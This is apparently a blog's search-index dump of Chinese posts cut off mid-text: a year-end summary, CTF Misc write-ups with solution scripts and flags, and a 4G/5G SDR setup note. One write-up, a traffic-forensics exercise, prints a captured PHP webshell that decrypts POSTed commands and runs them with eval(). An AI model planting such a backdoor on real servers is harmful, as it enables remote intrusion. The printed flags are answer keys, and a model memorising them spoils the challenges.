然后为了解解辣，我们第二天就去吃了水煮牛肉，感觉味道也还不错 春熙太古里也是非常的热闹，就算到了两三点，外面路上还是有挺多人，不愧是有夜生活的城市 然后比赛上也还是有点遗憾，依旧只拿了二等奖，感觉是今年可恶的可信计算的锅 早知道就和北邮一样直接把这部分的分舍弃了，专心和队友一起看AWDP和渗透了 但是二等奖的获得也确实不容易，还是要感谢队友们一路来的互帮互助 最后，在比赛结束那晚的晚宴上，也是有幸见到了沈昌祥院士，并成功地与沈院士拍了一张合照 九月 保研流水账 因为一直有读研的想法，然后看看自己的GPA，发现应该能保研，于是就放弃了就业，打算尝试保研并继续读研 虽然拿到了本校的保研资格，但是由于自己的裸绩并不是专业第一，而且学校也没办法开出增值和综测的证明 由于自己的本科也只是一个四非院校，因此保研投递路上并不是一帆风顺，前期投递了好多院校，但是成功过筛的也没多少 不过好在夏令营的时候，信工所给了我一个机会，可能是看我有打CTF竞赛的经历吧，面试上也没有什么刁难，顺利的拿到了优营 感谢信工所，给了我第一个铁Offer，有了第一个Offer以后，身上的担子就轻了很多，后续比信工所差的学校也就不考虑了 然后信工所的优营会提供一个参观信工所的机会，并且包住宿和伙食，因此我也打算借着这个机会来首都北京看看 当然来了以后或多或少还是有一些失望，然后那时候正值暑假旅游旺季，北京遍地都是人挤人 并且北京周围的街景还有周围的商场啥的当时就给我留下了深刻的不太好的印象，好像和我心目中繁华的首都还是有一定的差距 其实当时去北京还有一个愿望，就是去自己从小以来心目中的梦校——清华大学参观一下 但是可能是由于来参观的人太多了，导致清华和北大的访客参观都是抽签摇号制 很幸运摇到了第二天的号，顺利地拿到了进清华参观的机会 因此我趁着第二天午休的时间，急匆匆地打了车，然后到清华门口排队入校参观 当时一踏进园子的时候，回忆里的什么东西仿佛正中我的眉心，终于来到了自己做梦都想来的地方（虽然只是短暂的参观 因为时间紧迫，我也没法过多的停留，因此只能急匆匆地速通了一下，希望下次来的时候可以让我多待一会 参观完清华后，我就准备收拾东西回金华了，毕竟信工所感觉确实和我想去读研的地方有点出入 感觉就是高高的写字楼，校区也不大，没有操场也没有湖，感觉就没有啥学生生活（虽然研一要去怀柔校区上课 但是毕竟没有985 211的title，网上说会是学历寄存器，因此当时就下定决心要继续投更好的学校了 后来的过程中也是尝试了南开、西电等等学校，那边老师说可以给我名额，但是需要我提前给确定的答复 当时还报了浙软，所以一直想冲一冲浙大，就放弃了那些机会（Tips：南开不给专硕提供宿舍 然后浙软的夏令营也是在老师的帮助下顺利拿到了优营，但是最后预推免还是不争气地败在了机试上（呜呜呜，我的浙大梦~ 浙软碰壁后我也是继续尝试联系别的学校的老师，也是很幸运地联系到了北邮的老师 最后929的时候其实也没啥选择，就拒了信工所然后选择去了北邮 十月 华晨宇演唱会(浙江·杭州) 10月26号，和对象一起去杭州大莲花(奥体中心)看了华晨宇的火星演唱会 同时这也是我第一次线下看演唱会，场馆里面也是几乎都坐满了人，现场氛围挺好的，会有大合唱啥的 虽然大部分歌我都是唱不来的，会唱的也就那么四五首吧。。(没事，感受个线下的氛围也行) 十一月 浙江省省赛(浙江·杭州) 每年的经典环节，也是大四老东西的省赛最后一舞了，每次都是差一点就能AK Misc方向的赛题，唉 今年A1natas也是非常的给力，再次刷新记录一口气拿下了四个省一，实验室的后浪们tql 衷心希望A1natas之后能越来越好，在各大网络安全赛事上再创佳绩！ 十二月 睿抗网络安全全国总决赛(湖北·武汉) 很早之前就和队友报名的比赛，比赛本身没啥含金量，但是架不住它在教育部名单和学校的竞赛目录中 初","date":"2025-01-02","objectID":"/posts/6f0ed5c/:0:0","tags":["年终总结"],"title":"2024 年终总结","uri":"/posts/6f0ed5c/"},{"categories":["Writeup"],"content":"这比赛本身没啥好说的，竟然出现了这么多的原题，非常的难评只能说 但是如果就涉及到的题目本身而言，还是可以稍微记录一下的 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 不良劫 附件给了一张PNG图片，但是010打开发现是JPG的文件头，因此我们需要改后缀为.jpg 然后再010打开，发现文件末尾藏了一张PNG图片 我们手动提取出来可以得到下图 发现是一张被污染的二维码，我们直接尝试提取红色通道中的图像，然后用PPT补上定位块 扫码得到前半段的flag：DASCTF{014c6e74-0c4a-48fa 然后我们再回头看那张jpg图片，经过尝试发现是单图盲水印 因此得到后半段flag：-8b33-ced06f847e39} 综上，最后的flag为：DASCTF{014c6e74-0c4a-48fa-8b33-ced06f847e39} 题目名称 gza_Cracker 题目附件给了一个pcap流量包，打开后发现是哥斯拉流量 然后在流11中发现攻击者传了一个类似字典的数据 因此猜测题目需要我们用这个字典去爆破哥斯拉的加密密钥，因此我们写个脚本爆破一下密钥并解密流量即可 import re import io import gzip import json import base64 import hashlib import subprocess import urllib.parse def url_decode(encoded_str): return urllib.parse.unquote(encoded_str) def xor_decode(data: bytes, key: bytes) -\u003e bytes: result = bytearray() for i in range(len(data)): c = key[(i + 1) \u0026 15] result.append(data[i] ^ c) return bytes(result) def gunzip_bytes(compressed_data: bytes) -\u003e bytes: with gzip.GzipFile(fileobj=io.BytesIO(compressed_data)) as f: return f.read() def decrypt_traffic(filename,key): http_data = [] command = [ \"tshark\", # tshark的路径，如果在环境变量里这里就不用改 '-r', filename, # 读取指定的 pcapng 文件 '-Y', 'http', # 过滤出 HTTP 数据包 '-T', 'json', # 输出为 JSON 格式 '-e', 'http.file_data', # 请求中的文件数据（POST 请求的内容） '-e', 'http.response.phrase', # 响应短语 '-e', 'http.content_type' # 响应内容类型 ] result = subprocess.run( command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) json_output = json.loads(result.stdout) # print(json.dumps(json_output, indent=4)) # 这个输出是用来调试的，可以移除 # 遍历 JSON 数据并提取字段 for packet in json_output: layers = packet.get('_source', {}).get('layers', {}) request_method = layers.get('http.request.method', ['None'])[0] response_code = layers.get('http.response.code', ['None'])[0] file_data = layers.get('http.file_data', ['None'])[0] try: http_data.append(url_decode(bytes.fromhex(file_data).decode('utf-8'))) except: pass for item in http_data: # print(item) if \"Antsword=\" in item: try: enc = re.findall(r\"Antsword=(.*)\",item)[0] # print(enc) dec = xor_decode(base64.b64decode(enc),key.encode('utf-8')) dec = gunzip_bytes(dec).decode('utf-8',errors='ignore') print(f\"[+] 请求: {dec}\") except: pass if \"e71f50e9773b23f9\" in item: try: enc = re.findall(r\"e71f50e9773b23f9(.*)792dea3a7ae385ca\",item)[0] dec = xor_decode(base64.b64decode(enc),key.encode('utf-8')) dec = gunzip_bytes(dec).decode('utf-8',errors='ignore') print(f\"[+] 响应: {dec}\") except: pass def md5_encode(text): return hashlib.md5(text.encode('utf-8')).hexdigest() def crack_key(key_list,target_hash): pwd = \"Antsword\" # 哥斯拉的连接密码 for key in key_list: tmp = md5_encode(key) # 明文密钥的MD5 tmp_hash = md5_encode(pwd+tmp[:16]) # 响应中返回的hash if tmp_hash == target_hash: print(f\"[+] 密钥爆破成功: {key}\") print(f\"[+] 用于解密哥斯拉流量的密钥为 {tmp[:16]}\") return key if __name__ == '__main__': # 响应中返回的hash # target_hash = \"e71f50e9773b23f9792dea3a7ae385ca\" # with open(\"dic.txt\",'r') as f: # key_list = f.read().split() # crack_key(key_list, target_hash) # [+] 密钥爆破成功: Antsw0rd # [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e decrypt_traffic('Crack_me.pcap','a18551e65c48f51e') 然后base64解码即可得到最后的flag：DASCTF{M0Y_W1sh_Y0u_LogF1le_Usg32WEM} 当然也可以用CTF-NetA一把梭，导入一下题目给我们的字典即可 题目名称 特殊流量2 过滤一下200的数据包，发现其中传了一个zip \u003c?php $cmd = @$_POST['ant']; $pk = \u003c\u003c\u003cEOF -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfhiyoPdM6svJZ+QlYywklwVcx PkExXQDSdke4BVYMX8Hfohbssy4G7Cc3HwLvzZVDaeyTDaw+l8qILYezVtxmUePQ 5qKi7yN6zGVMUpQsV6kFs0GQVkrJWWcNh7nF6uJxuV+re4j+t2tKF3NhnyOtbd1J RAcfJSQCvaw6O8uq3wIDAQAB -----END PUBLIC KEY----- EOF; $cmds = explode(\"|\", $cmd); $pk = openssl_pkey_get_public($pk); $cmd = ''; foreach ($cmds as $value) { if (openssl_public_decrypt(base64_decode($value), $de, $pk)) { $cmd .= $de; } } foreach($_POST as $k =\u003e $v){ if (openssl_public_decrypt(base64_decode($v), $de, $pk)) { $_POST[$k]=$de; } } eval($cmd); 然后翻看后续的流量包，发现主要是蚁剑流量，结合以上代码可知应该是用了RSA编码器 可以使用CTF-NetA导入公钥后一把梭 发现这里执行了一条命令，把secret中的i和7全都替换成x后的内容告诉我们了 同时它也给了我们修改前secret的MD5值 然后发现攻击者往flag.txt中写入了一段AES加密的密文 因此结合以上内容，猜测出题人需要我们还原密钥并解AES 我们可以先写个脚本列出密钥的所有可能情况 from ite","date":"2024-12-29","objectID":"/posts/69e332a/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 楚慧杯网络与数据安全实践能力竞赛 Misc Writeup","uri":"/posts/69e332a/"},{"categories":["Research"],"content":"4G5G网络安全相关内容的研究 基础概念 概念名称 描述 信令风暴 信令风暴（Signaling Storm）通常指的是在通信网络中，由于大量的控制信令（如呼叫建立、注册、认证等）快速且重复地传递，导致网络负载过重，系统资源耗尽，从而影响正常通信的情况。信令风暴最常见于电信网络中，尤其是在移动通信、VoIP（Voice over IP）系统、以及IMS（IP Multimedia Subsystem）等系统中。 SIB SIB（System Information Block，系统信息块是移动通信网络中用于传输网络系统配置信息的一种数据结构，主要用于传递一些与网络状态和参数有关的重要信息。SIB通常用于LTE（Long Term Evolution）和5G NR（New Radio）等现代通信网络中。它的作用是帮助终端设备（如手机、物联网设备等）获取网络的基本配置信息，从而能够顺利连接网络并进行通信。 TAC TAC（Tracking Area Code）：标识网络中的一个跟踪区域，用来管理和标识用户的位置信息。网络中由多个TAC组成，每个TAC代表一个物理区域，通常是多个基站的覆盖范围。 TAU TAU（Tracking Area Update）：是指UE在移动过程中向网络更新其当前位置的一种过程。当UE移动到新的跟踪区域时，网络会触发TAU过程，以便更新UE的位置和所在的TAC。TAU过程主要用于定位和切换等目的，在一定时间内，UE会周期性地进行TAU过程。 UE UE（User Equipment）：指的是用户的终端设备，如智能手机、物联网设备等，它们与基站进行通信。 IMSI IMSI（International Mobile Subscriber Identity）是国际移动用户身份码，用于唯一标识一个移动设备的订阅者（即用户）。它是全球每个移动用户的唯一标识符，通常由移动运营商分配给用户，并保存在SIM卡（Subscriber Identity Module）中。前三位是移动国家代码，再来是移动网络代码（00-中国移动，01-中国联通），最后是移动用户识别码（长度一般为9-10位） IMEI IMEI（International Mobile Equipment Identity）是国际移动设备身份码，用于唯一标识一部移动设备。每部手机、平板电脑、物联网设备等无线通信设备都会有一个唯一的IMEI号码，用来区别不同的设备。前八位是设备类型分配代码TAC（前6位是厂商，后2位是设备型号），接着的6位表示设备的唯一序列号，最后1位是校验位，357123047913247 PDCCH PDCCH是物理下行控制信道，用于传输下行链路控制信息。这些控制信息是网络发给用户设备（UE）的，用于调度、资源分配、信道状态信息反馈等。 PDSCH PDSCH是物理下行共享信道，用于传输实际的用户数据、控制信息、系统信息等。这些数据可能是来自网络层的应用数据，也可以是一些重要的系统信息。 Ubuntu20.04配置UHD并连接B210 参考连接： https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux 先根据参考链接中的步骤安装好相关依赖 sudo apt-get -y install autoconf automake build-essential ccache cmake cpufrequtils doxygen ethtool fort77 g++ gir1.2-gtk-3.0 git gobject-introspection gpsd gpsd-clients inetutils-tools libasound2-dev libboost-all-dev libcomedi-dev libcppunit-dev libfftw3-bin libfftw3-dev libfftw3-doc libfontconfig1-dev libgmp-dev libgps-dev libgsl-dev liblog4cpp5-dev libncurses5 libncurses5-dev libpulse-dev libqt5opengl5-dev libqwt-qt5-dev libsdl1.2-dev libtool libudev-dev libusb-1.0-0 libusb-1.0-0-dev libusb-dev libxi-dev libxrender-dev libzmq3-dev libzmq5 ncurses-bin python3-cheetah python3-click python3-click-plugins python3-click-threading python3-dev python3-docutils python3-gi python3-gi-cairo python3-gps python3-lxml python3-mako python3-numpy python3-numpy-dbg python3-opengl python3-pyqt5 python3-requests python3-scipy python3-setuptools python3-six python3-sphinx python3-yaml python3-zmq python3-ruamel.yaml swig wget 然后从源码编译并安装UHD git clone https://github.com/EttusResearch/uhd.git cd uhd/host mkdir build cd build cmake .. make sudo make install sudo ldconfig Tips：如果发现uhd4.7.0.0无法识别USRP设备，可以把uhd的版本降低为uhd4.6.0.0 编译并安全好后需要把以下环境变量的内容添加到.zshrc文件中 export LD_LIBRARY_PATH=/usr/local/lib UHD安装完成后我们还需要执行下面这个命令去下载UHD FPGA Images(可能需要科学上网) sudo uhd_images_downloader 下载完成后我们需要把以下环境变量的内容添加到.zshrc文件中 export UHD_IMAGES_DIR=\"/usr/local/share/uhd/images\" 上述工作完成后，我们将B210用USB连上电脑，然后执行以下命令 sudo uhd_usrp_probe sudo uhd_find_devices 若输出类似于以下的内容，则说明环境配置成功，B210已经成功连接 (base) [11ms][~]$ sudo uhd_usrp_probe [INFO] [UHD] linux; GNU C++ version 9.4.0; Boost_107100; UHD_4.6.0.0-0-unknown [INFO] [B200] Detected Device: B210 [INFO] [B200] Operating over USB 3. [INFO] [B200] Initialize CODEC control... [INFO] [B200] Initialize Radio control... [INFO] [B200] Performing register loopback test... [INFO] [B200] Register loopback test passed [INFO] [B200] Performing register loopback test... [INFO] [B200] Register loopback test passed [INFO] [B200] Setting master clock rate selection to 'automatic'. [INFO] [B200] Asking for clock rate 16.000000 MHz... [INFO] [B200] Actually got clock rate 16.000000 MHz. _____________________________________________________ / | Device: B-Series Device | _____________________________________________________ | / | | Mboard: B210 | | serial: 34414E4 | | name: MyB210 | | product: 2 | | revision: 4 | | FW Version: 8.0 | | FPGA Version: 16.0 | | | | Time sources: none, internal, external, gpsdo | | Clock sources: internal, external, gpsdo | | Sensors: ref_locked | | _____________________________________________________ | | / | | | RX DSP: 0 | | | | | | Freq ","date":"2024-12-24","objectID":"/posts/342f304/:0:0","tags":["Research"],"title":"4G5G网络安全相关内容的研究","uri":"/posts/342f304/"},{"categories":["Writeup"],"content":"忙里抽闲，简单地看了看题，感觉这场比赛的取证确实出得挺好的 给取证题 Just_F0r3n51Cs 的出题人点个赞👍 本文中涉及的具体题目附件可以进我的知识星球获取 线上初赛 题目名称 Tr4ffIc_w1th_Ste90 解压附件压缩包，可以得到一个流量包和一个加密的压缩包 打开流量包，发现主要是UDP流量，然后还有H264的视频数据 直接追踪UDP流，复制原始Hex数据，用Cyberchef转换一下 然后下载到本地改后缀为.264，VLC打开即可得到压缩包的解压密码：!t15tH3^pAs5W#RD*f0RFL@9 解压压缩包可以得到一张图片和加密图片的代码，遛一遛GPT写一个解密代码 import numpy as np import cv2 import sys import os def decode(input_image, output_dir, seed_range): to_recover = cv2.imread(input_image, cv2.IMREAD_GRAYSCALE) if to_recover is None: print(f\"Error: Unable to load image {input_image}\") exit(1) to_recover_array = np.asarray(to_recover) for seed in seed_range: np.random.seed(seed) row_indices = list(range(to_recover_array.shape[0])) col_indices = list(range(to_recover_array.shape[1])) np.random.shuffle(row_indices) np.random.shuffle(col_indices) row_reverse = np.argsort(row_indices) col_reverse = np.argsort(col_indices) recovered_image = to_recover_array[row_reverse, :] recovered_image = recovered_image[:, col_reverse] output_image = os.path.join(output_dir, f\"recovered_seed_{seed}.png\") cv2.imwrite(output_image, recovered_image) print(f\"Decoded image saved as {output_image}\") def main(): if len(sys.argv) != 4: print('error! Please provide input image path, output directory, and seed range as command-line arguments.') exit(1) input_image = sys.argv[1] output_dir = sys.argv[2] seed_start = int(sys.argv[3].split('-')[0]) # start of seed range seed_end = int(sys.argv[3].split('-')[1]) # end of seed range if not os.path.exists(output_dir): os.makedirs(output_dir) seed_range = range(seed_start, seed_end + 1) decode(input_image, output_dir, seed_range) if __name__ == '__main__': main() 运行上面的脚本爆破一下seed python decode.py encoded.png ./recovered_images 0-1000 然后可以得到一张DataMatrix二维码 在线网站扫码可以得到如下内容 I randomly found a word list to encrypt the flag. I only remember that Wikipedia said this word list is similar to the NATO phonetic alphabet. crumpled chairlift freedom chisel island dashboard crucial kickoff crucial chairlift drifter classroom highchair cranky clamshell edict drainage fallout clamshell chatter chairlift goldfish chopper eyetooth endow chairlift edict eyetooth deadbolt fallout egghead chisel eyetooth cranky crucial deadbolt chatter chisel egghead chisel crumpled eyetooth clamshell deadbolt chatter chopper eyetooth classroom chairlift fallout drainage klaxon 最后找个PGP词汇表解密脚本解密即可得到flag：D0g3xGC{C0N9rA7ULa710n5_Y0U_HaV3_ACH13V3D_7H15_90aL} aaa = [['00', 'aardvark', 'adroitness'], ['01', 'absurd', 'adviser'], ['02', 'accrue', 'aftermath'], ['03', 'acme', 'aggregate'], ['04', 'adrift', 'alkali'], ['05', 'adult', 'almighty'], ['06', 'afflict', 'amulet'], ['07', 'ahead', 'amusement'], ['08', 'aimless', 'antenna'], ['09', 'Algol', 'applicant'], ['0A', 'allow', 'Apollo'], ['0B', 'alone', 'armistice'], ['0C', 'ammo', 'article'], ['0D', 'ancient', 'asteroid'], ['0E', 'apple', 'Atlantic'], ['0F', 'artist', 'atmosphere'], ['10', 'assume', 'autopsy'], ['11', 'Athens', 'Babylon'], ['12', 'atlas', 'backwater'], ['13', 'Aztec', 'barbecue'], ['14', 'baboon', 'belowground'], ['15', 'backfield', 'bifocals'], ['16', 'backward', 'bodyguard'], ['17', 'banjo', 'bookseller'], ['18', 'beaming', 'borderline'], ['19', 'bedlamp', 'bottomless'], ['1A', 'beehive', 'Bradbury'], ['1B', 'beeswax', 'bravado'], ['1C', 'befriend', 'Brazilian'], ['1D', 'Belfast', 'breakaway'], ['1E', 'berserk', 'Burlington'], ['1F', 'billiard', 'businessman'], ['20', 'bison', 'butterfat'], ['21', 'blackjack', 'Camelot'], ['22', 'blockade', 'candidate'], ['23', 'blowtorch', 'cannonball'], ['24', 'bluebird', 'Capricorn'], ['25', 'bombast', 'caravan'], ['26', 'bookshelf', 'caretaker'], ['27', 'brackish', 'celebrate'], ['28', 'breadline', 'cellulose'], ['29', 'breakup', 'certify'], ['2A', 'brickyard', 'chambermaid'], ['2B', 'briefcase', 'Cherokee'], ['2C', 'Burbank', 'Chicago'], ['2D', 'button', 'clergyman'], ['2E', 'buzzard', 'coherence'], ['2F', 'cement', 'combustion'], ['30', 'chairlift', 'commando'], ['31', 'chatter', 'company'], ['32', 'checkup","date":"2024-12-12","objectID":"/posts/7bf9cb0/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 国城杯网络安全挑战赛 Misc Writeup","uri":"/posts/7bf9cb0/"},{"categories":["Writeup"],"content":"比赛结束后有师傅来问里面的题，后面才知道原来是哈工大的邀请赛 羡慕能被邀请的学校，啥时候能顺便邀请一下A1natas呢 QAQ 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 BOMB 解压附件压缩包，可以得到一个Bomb.exe，010打开发现里面藏了一个压缩包 这里可以直接使用foremost提取出来，压缩包注释中有第一层的解压密码 仔细观察可以发现有一个Passsword.txt的压缩后大小和别的明显不同，用解压密码分别解压一下两种Password.txt 发现压缩大小为24的那个TXT是里面那个压缩包的解压密码，因此很明显，就是压缩包套娃了 因此我们编写以下脚本，循环提取出压缩后大小大于17的TXT文件中的密码，然后压缩包解套 import os import pyzipper def extract_zip(zip_file,passwd): if not os.path.exists('./tmp'): os.mkdir('./tmp') with pyzipper.ZipFile(zip_file,\"r\") as zip_ref: for zipinfo in zip_ref.filelist: if '.txt' not in zipinfo.filename: zip_ref.extract(zipinfo,'./tmp',pwd=passwd.encode()) else: # 提取压缩包中特定压缩大小的文件 if zipinfo.compress_size \u003e 17: zip_ref.extract(zipinfo,'./tmp',pwd=passwd.encode()) with open(\"./tmp/Password.txt\",\"r\") as f: passwd = f.read() os.remove(zip_file) os.system(\"mv ./tmp/*.zip .\") return passwd if __name__ == \"__main__\": zip_file = \"nextlevel.zip\" passwd = \"Ll3zHsArHF\" cnt = 1 while True: print(f\"[+] 第{cnt}层的密码是：{passwd}\") passwd = extract_zip(zip_file,passwd) cnt += 1 在WSL中运行以上脚本后即可得到flag：flag{e1c1d86f-4407-41c7-94c4-9609fdb5862e} 题目名称 Knock 题目名称 CAN 题目名称 Special_signal 题目名称 payment ","date":"2024-12-04","objectID":"/posts/9651477/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 HITCTF安天杯网络安全国际邀请赛 Misc Writeup","uri":"/posts/9651477/"},{"categories":["Writeup"],"content":"2024 吾杯网络安全大赛 Misc Writeup 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 Sign 附件给了一个TXT，内容如下： 57754375707B64663335376434372D333163622D343261382D616130632D3634333036333464646634617D 直接CyberChef解hex即可得到flag：WuCup{df357d47-31cb-42a8-aa0c-6430634ddf4a} 题目名称 原神启动！ 解压附件得到一张PNG图片和一个加密的压缩包 PNG图片存在LSB隐写，用StegSolve提取一下可以得到 WuCup{7c16e21c-31c2-439e-a814-bba2ca54101a}作为密码解压压缩包可以得到一个docx文件 改后缀为zip然后解压，可以得到一个加密的img.zip压缩包 然后\\word\\media路径下还是有一张PNG图片，存在LSB隐写，提取一下可以得到 然后可以解压img.zip，得到一个text.zip，这个压缩包的解压密码在word中 需要把上面那张白色图片移开，然后把字体改成红色才能看到 最后使用得到的密码解压text.zip即可得到flag：WuCup{0e49b776-b732-4242-b91c-8c513a1f12ce} 题目名称 太极 本题的题面如下： 题目附件给了一个TXT文件，内容如下： 太极生两仪-两仪生四象-四象生八卦-八卦定吉凶-吉凶生大业 也是看了四个Hint后才理解题目的意思，就是依次取每个汉字的拼音的1-5位，超出就取模一下拼音长度 可以直接写个脚本生成一下flag：WuCup{tieny-lieig-sieau-bunig-jieay} data = \"tai ji sheng liang yi liang yi sheng si xiang si xiang sheng ba gua ba gua ding ji xiong ji xiong sheng da ye\".split() cnt = 1 res = [] tmp = '' for item in data: lenth = len(item) tmp += item[(cnt-1) % lenth] if cnt == 5: res.append(tmp) tmp = '' cnt = 1 else: cnt += 1 flag = \"WuCup{\" + \"-\".join(res) + '}' print(flag) 碎碎念：不知道出题人出这种脑洞题的意图在哪，题目描述都不清晰，没有Hint是真的难以理解，有点难评只能说。。 题目名称 旋转木马 题目附件给了两个压缩包，解压后得到flag1和flag2两个文件 010打开发现都是一大串base64，结合题目名称，猜测就是base64循环解码 因此，我们写个脚本合并两个文件，然后base64循环解码可以得到一串十六进制 最后十六进制转字符串即可得到最后的flag：WuCup{1eb900c0-a786-42fa-942c-f9a7c21dfedf} 完整解题脚本如下： from base64 import * def merge_data(): with open(\"flag1\",\"r\") as f1: data1 = f1.read() with open(\"flag2\",\"r\") as f2: data2 = f2.read() res = data1 + data2 with open(\"flag\",\"w\") as f: f.write(res) print(f\"[+] 文件合并成功\") def solve(): with open(\"flag\",\"r\") as f: data = f.read() cnt = 1 while True: if len(data) % 4 !=0 : data += \"=\" * (4 - len(data) % 4) try: res = b64decode(data).decode() print(f\"[+] 第{cnt}次base64解码成功 ===\u003e\") cnt += 1 except: print(\"[-] base64循环解码结束\") break data = res return data if __name__ == \"__main__\": merge_data() data = solve() idx = data.find(\"=\") flag = bytes.fromhex(data[:idx]) print(flag) # b'WuCup{1eb900c0-a786-42fa-942c-f9a7c21dfedf}' 题目名称 音文 下载附件得到一个AT.wav，用010打开发现末尾藏了一个压缩包 手动给它提取出来然后打开，发现里面有很多数字+汉字的TXT文件，猜测需要根据数字的顺序把汉字提取出来 因此编写以下脚本把汉字提取出来 import zipfile import re def extract_num(filename): # group(0)表示整个匹配到的字符串，group(1)表示正则表达式中第一个捕获组 return int(re.search(r'(\\d+)', filename).group()) def extract_data(): res = '' filelist = [] filename = \"1.zip\" with zipfile.ZipFile(filename, 'r') as zip_ref: file_list = [name.encode('cp437').decode('gbk') for name in zip_ref.namelist()] for item in file_list: tmp = re.sub(r\"download_url\\/\",\"\",item) tmp = re.sub(r\".txt\",\"\",tmp) if tmp != \"\": filelist.append(tmp) sorted_list = sorted(filelist, key=extract_num) # print(res) for item in sorted_list: chars = re.findall(r\"[\\u4e00-\\u9fa5]\",item)[0] res += chars print(res) if __name__ == \"__main__\": extract_data() 运行脚本后，可以得到如下内容 苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛哎哟哎哟哎哟哎哟哎哟你干嘛苏珊苏珊苏珊苏珊哎哟你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛哎哟苏珊苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛哎哟苏珊苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊苏珊哎哟哎哟哎哟你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊苏珊苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊苏珊苏珊苏珊苏珊你干嘛哎哟哎哟哎哟苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊苏珊苏珊苏珊哎哟你干嘛哎哟哎哟苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊苏珊苏珊苏珊哎哟你干嘛哎哟哎哟苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊苏珊哎哟哎哟哎哟你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛哎哟哎哟哎哟哎哟苏珊你干嘛哎哟哎哟苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛哎哟哎哟哎哟哎哟哎哟你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊苏珊苏珊苏珊哎哟你干嘛哎哟苏珊苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛哎哟哎哟哎哟哎哟苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛哎哟哎哟苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛哎哟哎哟哎哟哎哟苏珊你干嘛哎哟哎哟哎哟哎哟苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛哎哟哎哟苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊苏珊哎哟哎哟哎哟你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊苏珊苏珊苏珊哎哟你干嘛哎哟苏珊苏珊苏珊苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛哎哟哎哟哎哟哎哟苏珊你干嘛哎哟哎哟哎哟哎哟苏珊你干嘛哎哟苏珊哎哟苏珊哎哟苏珊你干嘛苏珊哎哟苏珊苏珊苏珊你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛苏珊哎哟哎哟哎哟哎哟你干嘛哎哟哎","date":"2024-12-03","objectID":"/posts/3ab0c1d/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 吾杯网络安全大赛 Misc Writeup","uri":"/posts/3ab0c1d/"},{"categories":["Writeup"],"content":"2024 古剑山全国大学生网络攻防大赛 Misc Writeup 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 CS 题目附件就给了以下内容： 截获了一段密文字符串jhjnjcjikmkfjjjkkejkkekdjgjcjnjhjnjcjiko,明文就在其中，请你把它找出来？ 仔细观察上面的密文，可以看到有很多的j和k，然后j和k后面都跟了一个字符，因此我们可以把上述字符串分成以下两部分 str1 = \"jjjjkkjjkjkkjjjjjjjk\" str2 = 